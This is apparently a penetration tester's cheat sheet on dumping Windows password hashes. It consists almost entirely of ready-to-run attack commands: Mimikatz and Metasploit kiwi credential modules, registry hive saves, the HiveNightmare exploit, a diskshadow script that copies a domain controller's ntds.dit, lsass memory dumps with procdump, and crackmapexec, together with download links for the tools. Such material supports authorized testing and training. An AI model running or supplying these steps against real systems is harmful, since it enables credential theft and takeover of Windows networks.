# Dump Hash

**Summery:**
- [Dump Hash](#dump-hash)
  - [Windows Hashing](#windows-hashing)
  - [Mimikatz](#mimikatz)
  - [Metasploit](#metasploit)
  - [Dump registry](#dump-registry)
    - [HiveNightmare exploit](#hivenightmare-exploit)
      - [Binary](#binary)
      - [Powershell](#powershell)
      - [Powershell version](#powershell-version)
    - [For AD - Get ntds.dit](#for-ad---get-ntdsdit)
  - [Powerdump](#powerdump)
  - [Dump lsass](#dump-lsass)
    - [Procdump](#procdump)
    - [Psexec](#psexec)
    - [Recover password (Attacker machine) - Windows](#recover-password-attacker-machine---windows)
    - [Recover password (Attacker machine) - Linux](#recover-password-attacker-machine---linux)
  - [crackmapexec](#crackmapexec)
- [Source](#source)

## Windows Hashing

|Acronym|Name|Description|
|-|-|-|
|LM|LAN Manager|this hash is the oldest form of password storage used by Windows that are kept around for legacy systems. The algorithm used to create this hash utilizes a limited character set as input, so it's possible to try all combinations of letters and numbers to retrieve the original hash.|
|NTLM|NT LAN Manager|Modern Windows systems use this hashing algorithm to store passwords|
|NETLM|NETNTLM(v1/v2)|NetNTLM is a challenge-response protocol that is mainly used where Kerberos is not supported(v1 is disabled by default).|

## Mimikatz

Mimikatz binary

```batch
Mimikatz.exe
```

```batch
privilege::debug
token::elevate
lsadump::sam
sekurlsa::logonPasswords full
sekurlsa::credman
```

Powershell:

```powershell
powershell -ep bypass
Import-module .\Invoke-Mimikatz.ps1
```

```powershell
Invoke-Mimikatz
Invoke-Mimikatz -DumpCerts
Invoke-Mimikatz -DumpCreds -ComputerName target1.example.org
```

Resource:

    https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
    https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe?raw=true

## Metasploit

load kiwi

    creds_all
    kerberos_ticket_list
    creds_kerberos
    lsa_dump_sam
    wifi_list
    getsystem

## Dump registry

Dump registry:

    reg save hklm\sam c:\sam.dmp
    reg save hklm\system c:\system.dmp

Extract hash:

    samdump2 system.dmp sam.dmp

or

    secretsdump.py -sam sam.dmp -system system.dmp LOCAL

### HiveNightmare exploit

#### Binary 
Commands:

    HiveNightmare.exe

Resource:

    https://github.com/SecuProject/HiveNightmare/releases/download/1.0.0.0/HiveNightmare.exe

#### Powershell
Commands:

```powershell
powershell -ep bypass
.\Invoke-HiveNightmare.ps1 -path c:\Users\Public
```

Resource:

    https://raw.githubusercontent.com/WiredPulse/Invoke-HiveNightmare/main/Invoke-HiveNightmare.ps1

#### Powershell version

### For AD - Get ntds.dit

nano script.txt

```batch
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

```
diskshadow.exe /s script.txt
```

```
robocopy /B E:\Windows\ntds .\test ntds.dit
```

Exctract hash:

    secretsdump.py -sam sam.dmp -system system.dmp -ntds ntds.dit LOCAL

or

    Mimikatz
    lsadump::sam /system:system.dmp /sam:sam.dmp -ntds ntds.dit

## Powerdump

```powershell
powershell -ep bypass
Import-module .\Invoke-PowerDump.ps1
```

```
Invoke-PowerDump
```

Resource:

    https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1


## Dump lsass

### Procdump

Command:

    Procdump.exe -accepteula -ma lsass.exe

Resource:

    https://live.sysinternals.com/procdump.exe
    https://live.sysinternals.com/procdump64.exe

### Psexec

Command:

    psexec.exe -i -s lsass.exe

Resource:

    https://live.sysinternals.com/PsExec.exe
    https://live.sysinternals.com/PsExec64.exe

### Recover password (Attacker machine) - Windows

    Mimikatz "sekurlsa::minidump lsass.dmp"
    sekurlsa::LogonPasswords

### Recover password (Attacker machine) - Linux

    pypykatz lsa minidump lsass.dmp

## crackmapexec

    cme smb IP_ADDRESS -u USERNAME -p PASSWORD --sam

# Source 
- https://tryhackme.com/room/adventofcyber3
- https://pentestlab.blog/2021/08/16/hivenightmare/